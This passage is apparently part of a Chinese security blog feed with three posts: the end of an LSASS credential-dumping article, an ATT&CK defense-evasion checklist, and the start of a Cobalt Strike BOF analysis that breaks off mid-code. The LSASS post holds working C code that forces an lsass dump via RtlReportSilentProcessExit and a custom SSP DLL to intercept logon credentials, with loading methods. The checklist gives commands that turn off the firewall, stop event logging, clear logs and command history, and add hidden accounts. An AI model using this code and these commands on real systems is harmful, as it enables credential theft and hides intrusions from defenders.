class="string">"[!]GetModuleHandleW\n"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+]GetModuleHandleW: %X\n"</span>, (DWORD)hNtMod);</div><div class="line">fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)GetProcAddress(hNtMod, <span class="string">"RtlReportSilentProcessExit"</span>);</div><div class="line"><span class="keyword">if</span> (!fnRtlReportSilentProcessExit) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!]Get RtlReportSilentProcessExit\n"</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] RtlReportSilentProcessExit地址: %X\n"</span>, (DWORD)fnRtlReportSilentProcessExit);</div><div class="line">hLsassProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, <span class="number">0</span>, pid);</div><div class="line"><span class="keyword">if</span> (!hLsassProc) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] OpenProcess: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] OpenProcess: %X\n"</span>, (DWORD)hLsassProc);</div><div class="line">ntStatus = fnRtlReportSilentProcessExit(hLsassProc, <span class="number">0</span>);</div><div class="line">&#125; <span class="keyword">while</span> (false);</div><div class="line"><span class="keyword">if</span> (hNtMod)</div><div class="line">CloseHandle(hNtMod);</div><div class="line"><span class="keyword">if</span> (fnRtlReportSilentProcessExit)</div><div class="line">CloseHandle(fnRtlReportSilentProcessExit);</div><div class="line"><span class="keyword">if</span> (hLsassProc)</div><div class="line">CloseHandle(hLsassProc);</div><div class="line"><span class="keyword">if</span> (fnRtlReportSilentProcessExit)</div><div class="line">fnRtlReportSilentProcessExit = NULL;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x04-LSASS-SSP自加载"><a href="#0x04-LSASS-SSP自加载" class="headerlink" title="0x04 LSASS SSP自加载"></a>0x04 LSASS SSP自加载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSP，全称Security Support Provider，又名Security Package。针对绕过卡巴斯基的LSASS Dump可以使用<code>SSP</code>+<code>MiniDumpWriteDump</code>的方式。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" target="_blank" rel="external">Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages</a>一文中提供了如何编写一个可以使用的SSP dll文件。3gstudent在他的<a href="https://3gstudent.github.io/Mimikatz中SSP的使用" target="_blank" rel="external">Mimikatz中SSP的使用</a>介绍了SSP的基本原理和如何添加SSP的三种方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSP是一个dll，不同的功能对应不同的导出函数。具体可以参见下面的代码。该代码主要包含5个函数</p><ul><li>SpInitialize 用于初始化SSP并提供函数指针列表，此处可以直接返回</li><li>SpShutDown 用于卸载SSP，暂时无法卸载。</li><li>SpGetInfo 提供有关SSP的信息，包括版本，名称和说明</li><li>SpAcceptCredentials 可以执行的操作。</li><li>SpLsaModeInitialize 导出函数。</li></ul><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) </div><div class="line">&#123; </div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpShutDown(void) </div><div class="line">&#123; </div><div class="line"><span class="keyword">return</span> <span class="number">0</span>; </div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)</div><div class="line">&#123; </div><div class="line">PackageInfo-&gt;fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;</div><div class="line">PackageInfo-&gt;wVersion = <span class="number">1</span>;</div><div class="line">PackageInfo-&gt;wRPCID = SECPKG_ID_NONE;</div><div class="line">PackageInfo-&gt;cbMaxToken = <span class="number">0</span>;</div><div class="line">PackageInfo-&gt;Name = L<span class="string">"KiwiSSP"</span>;</div><div class="line">PackageInfo-&gt;Comment = L<span class="string">"Kiwi Security Support Provider"</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (flag == <span class="keyword">FALSE</span>)</div><div class="line">ProcessMain();  <span class="comment">//可以执行的操作</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =</div><div class="line">&#123;</div><div class="line">&#123;</div><div class="line"><span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>,SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span></div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line"><span class="comment">// SpLsaModeInitialize is called by LSA for each registered Security Package</span></div><div class="line">extern <span class="string">"C"</span> __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(<span class="keyword">ULONG</span> LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</div><div class="line">&#123;</div><div class="line">*PackageVersion = SECPKG_INTERFACE_VERSION;</div><div class="line">*ppTables = SecurityPackageFunctionTable;</div><div class="line">*pcTables = <span class="number">1</span>;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;添加SSP主要有三种方法。</p><ul><li><p>方法一:等待重启</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(1) 将ssp.dll复制到c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32</div><div class="line">(2) 修改HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\L</span>sa<span class="symbol">\的</span>Security Packages的值设置为ssp.dll</div><div class="line">(3) 等待系统重新启动</div></pre></td></tr></table></figure></li><li><p>方法二：调用AddSecurityPackage</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">(<span class="number">1</span>)(<span class="number">2</span>)同方法一</div><div class="line">(<span class="number">3</span>)调用AddSecurityPackage</div><div class="line">//测试代码如下</div><div class="line">//<span class="meta">#define SECURITY_WIN32</span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Security.h&gt;</span></span></div><div class="line">//<span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="string">"Secur32.lib"</span>)</span></div><div class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char **argv) </div><div class="line">&#123;</div><div class="line">SECURITY_PACKAGE_OPTIONS option<span class="comment">;</span></div><div class="line">option.Size = sizeof(option)<span class="comment">;</span></div><div class="line">option.Flags = <span class="number">0</span><span class="comment">;</span></div><div class="line">option.Type = SECPKG_OPTIONS_TYPE_LSA<span class="comment">;</span></div><div class="line">option.SignatureSize = <span class="number">0</span><span class="comment">;</span></div><div class="line">option.Signature = <span class="literal">NULL</span><span class="comment">;</span></div><div class="line">SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA(<span class="string">"mimilib"</span>, &amp;option)<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>方法三:使用RPC控制lsass加载SSP:这个方法的优势在于无需有过多敏感的痕迹(写注册表，调用AddSecurityPackage，不需要对lsass进程的内存进行写操作，lasss进程中不存在加载的dll)，这个方法是XPN大佬发现的，其开源在他的<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e" target="_blank" rel="external">github</a>中，并在他的博文<a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/" target="_blank" rel="external">exploring-mimikatz-part-2/</a>一文中有详细的介绍，其大概意思就是通过逆向分析AddSecurityPackage API函数，发现内部是通过RPC调用实现加载SSP.dll的。</p></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过测试使用SSP+MiniDumpWriteDump回调的方式会造成系统卡死，原因，和@seventeen师傅了解了，可能是巨硬家使用SSP并不支持回调。所以我直接使用SSP+MiniDumpWriteDump，并没有采用回调方式可以成功转储。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[+] 1. <a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf" target="_blank" rel="external">Some ways to dump LSASS.exe</a></p><p>[+] 2. <a href="https://xz.aliyun.com/t/10107" target="_blank" rel="external">几种免杀转储lsass进程的技巧</a> </p><p>[+] 3. <a href="https://forum.butian.net/share/887" target="_blank" rel="external">静默退出 DUMP LSASS.EXE</a></p><p>[+] 4. <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" target="_blank" rel="external">Intercepting Logon Credentials via Custom Security Support Provider and Authentication Packages</a></p><p>[+] 5. <a href="https://3gstudent.github.io/Mimikatz中SSP的使用" target="_blank" rel="external">Mimikatz中SSP的使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-现成工具&quot;&gt;&lt;a href=&quot;#0x01-现成工具&quot; class=&quot;headerlink&quot; title=&quot;0x01 现成工具&quot;&gt;&lt;/a&gt;0x01 现成工具&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;任务管理器&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;procdump:&lt;code&gt;procdump -ma lsass.exe lsass.dmp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Sharp dump:其核心也是使用&lt;code&gt;MiniDumpWriteDump&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Out-MiniDump:是PowerSploit下的一个&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;转储组件&lt;/a&gt;。同理也是使用&lt;code&gt;MiniDumpWriteDump&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK 防御规避</title>
    <link href="https://findream.github.io/2022/12/20/ATT&amp;CK%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF/"/>
    <id>https://findream.github.io/2022/12/20/ATT&amp;CK防御规避/</id>
    <published>2022-12-20T07:02:11.000Z</published>
    <updated>2023-03-26T06:37:16.117Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Bypass-UAC"><a href="#0x01-Bypass-UAC" class="headerlink" title="0x01 Bypass UAC"></a>0x01 Bypass UAC</h3><ul><li><a href="https://tttang.com/archive/1715/" target="_blank" rel="external">https://tttang.com/archive/1715/</a></li></ul><a id="more"></a><h3 id="0x02-令牌冒充-盗窃"><a href="#0x02-令牌冒充-盗窃" class="headerlink" title="0x02 令牌冒充/盗窃"></a>0x02 令牌冒充/盗窃</h3><ul><li>windows token 是一个用于描述进程线程安全上下文的对象。包含用户登录信息和权限<ul><li>用户SID</li><li>组SID</li><li>登录SID</li></ul></li><li><p>使用<code>DuplicateToken(Ex)</code>复制令牌，然后使用<code>ImpersonateLoggedOnUser</code>模拟用户登入，然后利用<code>SetThreadToken</code>模拟的令牌分配给线程，更多的是进行权限提升。</p></li><li><p><a href="https://www.secpulse.com/archives/131423.html" target="_blank" rel="external">https://www.secpulse.com/archives/131423.html</a></p></li></ul><h3 id="0x03-使用令牌创建进程"><a href="#0x03-使用令牌创建进程" class="headerlink" title="0x03 使用令牌创建进程"></a>0x03 使用令牌创建进程</h3><ul><li>使用<code>OpenProcessToken</code>打开进程的Token，通过<code>DuplicateToken(Ex)</code>复制令牌，并使用<code>CreateProcessWithTokenW</code>把复制的令牌用于创建在模拟用户的安全上下文下运行的新进程。这对于在其他用户的安全上下文下创建新进程很有用。</li><li>检测：基于windows API的安全基线，以及windows 日志审计</li><li><a href="https://www.secpulse.com/archives/131423.html" target="_blank" rel="external">https://www.secpulse.com/archives/131423.html</a></li></ul><h3 id="0x04-制作和模拟令牌"><a href="#0x04-制作和模拟令牌" class="headerlink" title="0x04 制作和模拟令牌"></a>0x04 制作和模拟令牌</h3><ul><li>如果对手有用户名和密码但用户未登录系统，则对手可以使用该功能为用户创建登录会话LogonUser。该函数将返回新会话访问令牌的副本，对手可以使用SetThreadToken该令牌将令牌分配给线程。</li></ul><h3 id="0x05-PPID-欺骗"><a href="#0x05-PPID-欺骗" class="headerlink" title="0x05 PPID 欺骗"></a>0x05 PPID 欺骗</h3><ul><li>设置进程线程属性，利用<code>UpdateProcThreadAttribute</code>设置<code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code>父进程属性为父进程的<code>Handle</code>即可。</li><li><a href="http://hacky.ren/2022/11/25/Bypass%20EDR%20and%20AV/" target="_blank" rel="external">http://hacky.ren/2022/11/25/Bypass%20EDR%20and%20AV/</a></li></ul><h3 id="0x06-BITS-Jobs"><a href="#0x06-BITS-Jobs" class="headerlink" title="0x06 BITS Jobs"></a>0x06 BITS Jobs</h3><ul><li>后台智能传输服务，某种意义上的LOLBin，经常用于下载和持久化</li></ul><h3 id="0x07-反调试器"><a href="#0x07-反调试器" class="headerlink" title="0x07 反调试器"></a>0x07 反调试器</h3><ul><li><a href="http://hacky.ren/2018/02/19/一篇文章带你了解反调试技术/" target="_blank" rel="external">http://hacky.ren/2018/02/19/一篇文章带你了解反调试技术/</a></li></ul><h3 id="0x08-加密文件"><a href="#0x08-加密文件" class="headerlink" title="0x08 加密文件"></a>0x08 加密文件</h3><ul><li>加密文件</li></ul><h3 id="0x09-文件目录权限修改"><a href="#0x09-文件目录权限修改" class="headerlink" title="0x09 文件目录权限修改"></a>0x09 文件目录权限修改</h3><ul><li>修改文件ACL，阻止安全工具运行<ul><li><code>cacls %PROGRAM_DATA%; Trusteer\Rapport\store\exts\RapportCerberus\baseline\RapportGH.dll” /T /E /C /P user:perm</code> 即替换用户访问权限</li></ul></li></ul><h3 id="0x10-隐藏文件和目录"><a href="#0x10-隐藏文件和目录" class="headerlink" title="0x10 隐藏文件和目录"></a>0x10 隐藏文件和目录</h3><ul><li>文件隐藏 attrib +h</li><li>windows API</li></ul><h3 id="0x11-隐藏用户"><a href="#0x11-隐藏用户" class="headerlink" title="0x11 隐藏用户"></a>0x11 隐藏用户</h3><ul><li>攻击者可以将特定用户的<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code>注册表键值设置为0，以防止该用户被列在登录屏幕上。</li><li>影子账户 net user user1$ pass /add</li></ul><h3 id="0x12-隐藏窗口"><a href="#0x12-隐藏窗口" class="headerlink" title="0x12 隐藏窗口"></a>0x12 隐藏窗口</h3><ul><li>ProcessWindowStyle.Hidden</li></ul><h3 id="0x13-NTFS文件属性"><a href="#0x13-NTFS文件属性" class="headerlink" title="0x13 NTFS文件属性"></a>0x13 NTFS文件属性</h3><ul><li><p>ADS 即alternate data streams(交换数据流)</p></li><li><p><a href="https://www.qingsword.com/qing/812.html" target="_blank" rel="external">利用NTFS交换数据流隐藏文件</a></p></li></ul><h3 id="0x14-VBA-Stomping"><a href="#0x14-VBA-Stomping" class="headerlink" title="0x14 VBA Stomping"></a>0x14 VBA Stomping</h3><ul><li><a href="https://forum.butian.net/share/1570" target="_blank" rel="external">https://forum.butian.net/share/1570</a></li><li>pcode2code工具可以获取隐藏的code</li></ul><h3 id="0x15-进程参数欺骗"><a href="#0x15-进程参数欺骗" class="headerlink" title="0x15 进程参数欺骗"></a>0x15 进程参数欺骗</h3><ul><li>修改 <code>PEB.ProcessParameters.CommandLine</code></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/can-shu-qi-pian" target="_blank" rel="external">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/can-shu-qi-pian</a></li></ul><h3 id="0x16-劫持进程流程"><a href="#0x16-劫持进程流程" class="headerlink" title="0x16 劫持进程流程"></a>0x16 劫持进程流程</h3><ul><li>Dll搜索顺序劫持</li><li>Dll侧加载</li><li>PATH环境变量顺序劫持</li><li>COR_PROFILER</li><li>内核回调表</li></ul><h3 id="0x17-禁用和修改工具"><a href="#0x17-禁用和修改工具" class="headerlink" title="0x17 禁用和修改工具"></a>0x17 禁用和修改工具</h3><ul><li>禁用AMSI，windows Definder，EDR，防火墙，</li></ul><h3 id="0x18-禁用Windows日志记录和命令历史记录"><a href="#0x18-禁用Windows日志记录和命令历史记录" class="headerlink" title="0x18 禁用Windows日志记录和命令历史记录"></a>0x18 禁用Windows日志记录和命令历史记录</h3><ul><li>使用<code>Stop-Service -Name EventLog</code>禁用EventLog</li><li>使用<code>auditpol</code>关闭用户登录的审核记录</li></ul><h3 id="0x19-禁用和修改系统防火墙"><a href="#0x19-禁用和修改系统防火墙" class="headerlink" title="0x19 禁用和修改系统防火墙"></a>0x19 禁用和修改系统防火墙</h3><ul><li><code>netsh firewall set opmode mode=disable</code></li><li><code>netsh advfirewall set allprofiles state off</code></li></ul><h3 id="0x20-安全模式启动"><a href="#0x20-安全模式启动" class="headerlink" title="0x20 安全模式启动"></a>0x20 安全模式启动</h3><h3 id="0x21-降级攻击"><a href="#0x21-降级攻击" class="headerlink" title="0x21 降级攻击"></a>0x21 降级攻击</h3><ul><li>为了Bypass AMSI，可以降级使用Powershell2</li></ul><h3 id="0x22-清除windows-日志"><a href="#0x22-清除windows-日志" class="headerlink" title="0x22 清除windows 日志"></a>0x22 清除windows 日志</h3><h3 id="0x23-清空命令记录"><a href="#0x23-清空命令记录" class="headerlink" title="0x23 清空命令记录"></a>0x23 清空命令记录</h3><ul><li>删除<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li></ul><h3 id="0x24-文件删除"><a href="#0x24-文件删除" class="headerlink" title="0x24 文件删除"></a>0x24 文件删除</h3><ul><li>wevtutil cl system</li><li>wevtutil cl application等等</li></ul><h3 id="0x25-间接命令执行"><a href="#0x25-间接命令执行" class="headerlink" title="0x25 间接命令执行"></a>0x25 间接命令执行</h3><ul><li>例如WMI创建进程</li></ul><h3 id="0x26-伪装"><a href="#0x26-伪装" class="headerlink" title="0x26 伪装"></a>0x26 伪装</h3><ul><li>无效代码签名</li><li>使用RTLO伪装字符串和/或文件名</li><li>重命名系统实用程序</li><li>伪装任务或者服务</li><li>匹配合法名称和位置</li><li>双文件拓展名</li></ul><h3 id="0x27-混淆文件或信息"><a href="#0x27-混淆文件或信息" class="headerlink" title="0x27 混淆文件或信息"></a>0x27 混淆文件或信息</h3><ul><li>二进制填充</li><li>软件打包</li><li>隐写</li><li>动态API解析</li></ul><h3 id="0x28-反射代码加载"><a href="#0x28-反射代码加载" class="headerlink" title="0x28 反射代码加载"></a>0x28 反射代码加载</h3><ul><li>反射代码加载</li></ul><h3 id="0x29-系统二进制代理执行"><a href="#0x29-系统二进制代理执行" class="headerlink" title="0x29 系统二进制代理执行"></a>0x29 系统二进制代理执行</h3><ul><li>编译好的HTML 即HTA</li><li>控制面板</li><li>MSIEXEC</li><li>Regsvc32</li><li>Rundll32</li></ul><h3 id="0x30-模板注入"><a href="#0x30-模板注入" class="headerlink" title="0x30 模板注入"></a>0x30 模板注入</h3><ul><li>office模板注入</li></ul><h3 id="0x31-虚拟化-沙箱规避"><a href="#0x31-虚拟化-沙箱规避" class="headerlink" title="0x31 虚拟化/沙箱规避"></a>0x31 虚拟化/沙箱规避</h3><h3 id="0x32-XSL脚本处理"><a href="#0x32-XSL脚本处理" class="headerlink" title="0x32 XSL脚本处理"></a>0x32 XSL脚本处理</h3><ul><li>XSL标准包括对各种语言的嵌入式脚本的支持</li><li>缺点：机器默认不安装msxsl.exe</li></ul><h3 id="0x33-MSBuild"><a href="#0x33-MSBuild" class="headerlink" title="0x33 MSBuild"></a>0x33 MSBuild</h3><ul><li>.NET 4中引入的MSBuild内联任务功能允许将C＃代码插入到XML项目文件中。</li><li><a href="http://red.y1ng.org/0x4_执行/T1127-win-基于白名单Msbuild.exe执行payload/" target="_blank" rel="external">http://red.y1ng.org/0x4_执行/T1127-win-基于白名单Msbuild.exe执行payload/</a></li><li><a href="https://www.freebuf.com/articles/network/197706.html" title="利用msbuild.exe绕过应用程序白名单安全机制的多种姿势" target="_blank" rel="external">利用msbuild.exe绕过应用程序白名单安全机制的多种姿势</a></li></ul><h3 id="0x34-LoLbin"><a href="#0x34-LoLbin" class="headerlink" title="0x34 LoLbin"></a>0x34 LoLbin</h3><ul><li><a href="http://hacky.ren/2022/11/25/Bypass%20EDR%20and%20AV/" target="_blank" rel="external">http://hacky.ren/2022/11/25/Bypass EDR and AV/</a></li></ul><h3 id="0x35-经常使用的技术"><a href="#0x35-经常使用的技术" class="headerlink" title="0x35 经常使用的技术"></a>0x35 经常使用的技术</h3><ul><li>伪装</li><li>混淆文件和信息</li><li>隐藏文件/用户</li><li>系统二进制代理执行</li><li>禁用和修改工具</li><li>清除windows 日志/历史命令</li><li>间接命令执行</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-Bypass-UAC&quot;&gt;&lt;a href=&quot;#0x01-Bypass-UAC&quot; class=&quot;headerlink&quot; title=&quot;0x01 Bypass UAC&quot;&gt;&lt;/a&gt;0x01 Bypass UAC&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tttang.com/archive/1715/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1715/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="https://findream.github.io/categories/ATT-CK/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike BOF生成原理分析</title>
    <link href="https://findream.github.io/2022/11/26/Cobalt%20Strike%20BOF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/11/26/Cobalt Strike BOF原理分析/</id>
    <published>2022-11-26T06:02:11.000Z</published>
    <updated>2022-11-12T07:14:20.771Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文首发于跳跳糖安全社区<a href="https://tttang.com/archive/1786/" target="_blank" rel="external">https://tttang.com/archive/1786/</a></li></ul><a id="more"></a><h2 id="0x01-Beacon-Object-File"><a href="#0x01-Beacon-Object-File" class="headerlink" title="0x01 Beacon Object File"></a>0x01 Beacon Object File</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF(Beacon 对象文件)是C/C++编译，但未链接产生的Obj文件，BOF运行在Beacon进程中，并执行内部的Beacon API和Win32 API函数。BOF本质是COFF Obj文件，其符合COFF文件格式规范，结构类似于windows PE文件格式。在被Cobalt Strike加载和使用过程中，BOF是一段地址无关的Shellcode，BOF本身体积比较小，在传输过程中，适用于那些传输带宽小的模式，然后其本身运行在beacon进程内部，不会重新创建进程，也可以有效规避EDR。</p><h2 id="0x02-如何开发BOF"><a href="#0x02-如何开发BOF" class="headerlink" title="0x02 如何开发BOF"></a>0x02 如何开发BOF</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是官方提供的一个demo<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beacon.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">char</span> * args, <span class="keyword">int</span> alen)</span> </span>&#123;</div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"Hello World: %s"</span>, args);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用Visual Studio或者MinGW进行编译,最后生成.obj文件。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cl<span class="selector-class">.exe</span> /c /GS- hello<span class="selector-class">.c</span> /Fo hello.obj</div><div class="line">i686-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div><div class="line">x86_64-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在cl.exe生成obj文件的时候，可能遇到<code>fatal error C1034: stdio.h: 不包括路径集</code>问题，产生这个的原因是没有设置对应的INCLUDE和LIB环境变量。而且不能仅仅设置Vs的Include的路径，还要设置SDK的路径。具体如下：<a href="https://blog.csdn.net/weixin_41115751/article/details/89817123" target="_blank" rel="external">https://blog.csdn.net/weixin_41115751/article/details/89817123</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在生成.obj之后，使用inline-execute + obj_path 执行obj文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF内部自带4种API，<code>数据解析API</code>，主要解析Aggressor Script 使用bof_pack函数打包的参数。<code>打印输出API</code>，主要起到打印输出的作用。格式化API，以及内部API。内部API主要包含一些令牌句柄的使用，以及进程注入相关的API。具体细节可以参考<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方的Bof文档</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据解析API主要包含：</p><ul><li>char <em> BeaconDataExtract (datap </em> parser, int * size)</li><li>int BeaconDataInt (datap * parser)</li><li>int BeaconDataLength (datap * parser)</li><li>void BeaconDataParse (datap <em> parser, char </em> buffer, int size)</li><li>short BeaconDataShort (datap * parser)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon.h中可以看到这些API原型。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div 